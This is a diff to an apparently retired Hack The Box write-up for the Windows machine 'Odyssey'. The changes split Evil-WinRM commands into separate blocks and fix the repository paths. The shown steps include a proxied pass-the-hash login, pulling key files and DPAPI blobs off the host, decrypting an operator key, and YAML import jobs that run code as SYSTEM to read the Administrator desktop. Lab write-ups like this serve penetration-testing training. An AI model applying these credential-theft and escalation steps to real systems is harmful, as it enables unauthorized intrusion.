@@ -1,5 +1,7 @@
 # HTB Odyssey
 
+**Hack The Box · Windows · Insane · Retired** · [Machine page](https://www.hackthebox.com/machines/odyssey)
+
 ## Summary
 
 Odyssey starts with a Node.js application on TCP/3000. Public JavaScript points to a username-less WebAuthn flow and an MDS compatibility endpoint. The MDS endpoint accepts a client-controlled MongoDB aggregation pipeline; a shallow stage allowlist can be bypassed by nesting `$lookup` inside `$facet`. An allowed `$function` expression then exposes MongoDB's embedded JavaScript engine and a module-loader file oracle.
@@ -26,14 +28,14 @@ Clone the repository and enter the machine directory before running any of the c
 
 ```bash
 git clone https://github.com/Zendeni/HTB-Writeups.git
-cd HTB-Writeups/Odyssey
+cd HTB-Writeups/Machines/HackTheBox/Odyssey
 ```
 
 If the repository is already present, update it and return to the same directory instead:
 
 ```bash
 git -C HTB-Writeups pull --ff-only
-cd HTB-Writeups/Odyssey
+cd HTB-Writeups/Machines/HackTheBox/Odyssey
 ```
 
 The recorded instance used these addresses:
@@ -996,21 +998,36 @@ C:\Program Files\Aegis Stream Collector\YamlDotNet.dll
 Connect interactively from the `Odyssey` directory so Evil-WinRM's relative local paths resolve correctly:
 
 ```bash
-proxychains4 -q evil-winrm \
-  -i 172.16.0.10 \
-  -u svc-aegis-deploy \
-  -H "$DEPLOY_NT_HASH"
+proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
 ```
 
-The following are Evil-WinRM client commands, not standalone PowerShell commands. Enter each `download` command separately at the interactive prompt; pasting the entire block as one multiline submission sends the lines to PowerShell, where `download` is not recognized.
+The following are Evil-WinRM client commands, not standalone PowerShell commands. Enter one code block at a time at the `*Evil-WinRM*` prompt and wait for it to finish before entering the next. Pasting multiple `download` lines together can send them to PowerShell as one submission, where `download` is not recognized.
 
 ```text
 Set-Location C:\Users\svc-aegis-deploy\Documents
+```
+
+```text
 download 'C:\ProgramData\AegisStream\keys\viewer.key' 'artifacts/aegisstream/viewer.key'
+```
+
+```text
 download 'C:\ProgramData\AegisStream\keys\operator.key.enc' 'artifacts/aegisstream/operator.key.enc'
+```
+
+```text
 download 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' 'artifacts/aegisstream/operator.wrap.bin'
+```
+
+```text
 download 'C:\Program Files\Aegis Stream Collector\AegisStream.Common.dll' 'artifacts/aegisstream/AegisStream.Common.dll'
+```
+
+```text
 download 'C:\Program Files\Aegis Stream Collector\AegisStreamSvc.dll' 'artifacts/aegisstream/AegisStreamSvc.dll'
+```
+
+```text
 download 'C:\Program Files\Aegis Stream Collector\YamlDotNet.dll' 'artifacts/aegisstream/YamlDotNet.dll'
 ```
 
@@ -1068,10 +1085,19 @@ TERM=dumb mcs -optimize+ \
   artifacts/AegisStreamClient.cs
 ```
 
-Upload it in Evil-WinRM and request decryption with the viewer key:
+Use a second Kali terminal for the local compilation, or reconnect after it finishes:
+
+```bash
+proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+```
+
+At the Evil-WinRM prompt, upload the client and request decryption with the viewer key. Enter the two commands separately:
 
 ```text
 upload artifacts/AegisStreamClient.exe AegisStreamClient.exe
+```
+
+```text
 .\AegisStreamClient.exe request 'C:\ProgramData\AegisStream\keys\viewer.key' DIAG_DECRYPT_TELEMETRY_BLOB 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' '.\operator.wrap.key'
 ```
 
@@ -1098,10 +1124,19 @@ The encrypted operator blob is laid out as a 12-byte nonce, 16-byte authenticati
 decrypted operator key: 32 bytes
 ```
 
-Upload the recovered operator HMAC key and verify it with a harmless export:
+Use a second Kali terminal for the local decryption, or reconnect afterward with the same one-line Evil-WinRM command:
+
+```bash
+proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+```
+
+Upload the recovered operator HMAC key and verify it with a harmless export. Enter the commands separately:
 
 ```text
 upload artifacts/aegisstream/operator.key operator.key
+```
+
+```text
 .\AegisStreamClient.exe request '.\operator.key' CONFIG_EXPORT - '.\config-export.yml'
 ```
 
@@ -1130,7 +1165,13 @@ In Evil-WinRM:
 
 ```text
 upload artifacts/aegisstream/proof.yml proof.yml
+```
+
+```text
 .\AegisStreamClient.exe request '.\operator.key' CONFIG_IMPORT '.\proof.yml' '.\proof-response.bin'
+```
+
+```text
 cmd /c type C:\ProgramData\AegisStream\logs\yaml-proof.txt
 ```
 
@@ -1143,7 +1184,13 @@ The execution identity is the AegisStream service account, not the deploy user. 
 
 ```text
 upload artifacts/aegisstream/stream-enum.yml stream-enum.yml
+```
+
+```text
 .\AegisStreamClient.exe request '.\operator.key' CONFIG_IMPORT '.\stream-enum.yml' '.\stream-enum-response.bin'
+```
+
+```text
 cmd /c type C:\ProgramData\AegisStream\logs\stream-token.txt
 ```
 
@@ -1171,27 +1218,48 @@ openssl enc -aes-256-cbc \
   -out artifacts/AuditWorker.enc
 ```
 
-Upload the generated files and included YAML jobs in Evil-WinRM:
+Use a second Kali terminal for the local build, or reconnect afterward:
+
+```bash
+proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+```
+
+At the Evil-WinRM prompt, enter each upload separately. Keep this session open after the uploads; the following `icacls` and import commands are Windows commands and must also run at the `*Evil-WinRM*` prompt, not in Kali.
 
 ```text
 upload artifacts/StreamRunner.exe StreamRunner.exe
+```
+
+```text
 upload artifacts/AuditWorker.enc AuditWorker.enc
+```
+
+```text
 upload artifacts/aegisstream/system-debug.yml system-debug.yml
+```
+
+```text
 upload artifacts/aegisstream/root-action.yml root-action.yml
 ```
 
 The files are staged in the deploy user's Documents directory, so explicitly grant the stream service only the access it needs:
 
-```cmd
-icacls C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe /grant "ODYSSEY\svc-aegis-stream:RX"
-icacls C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc /grant "ODYSSEY\svc-aegis-stream:R"
+```text
+cmd.exe /c icacls C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe /grant "ODYSSEY\svc-aegis-stream:RX"
+```
+
+```text
+cmd.exe /c icacls C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc /grant "ODYSSEY\svc-aegis-stream:R"
 ```
 
 Run the identity job first:
 
-```cmd
+```text
 .\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\system-debug.yml .\system-debug-response.bin
-type C:\ProgramData\AegisStream\logs\system-debug.txt
+```
+
+```text
+cmd.exe /c type C:\ProgramData\AegisStream\logs\system-debug.txt
 ```
 
 ```text
@@ -1206,7 +1274,7 @@ As on the SQL host, `NETWORK SERVICE` is the intermediate RPC/named-pipe identit
 
 The final job uses that SYSTEM child to read the Administrator desktop and write the result to the viewer-readable AegisStream log directory:
 
-```cmd
+```text
 .\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\root-action.yml .\root-action-response.bin
 ```
 
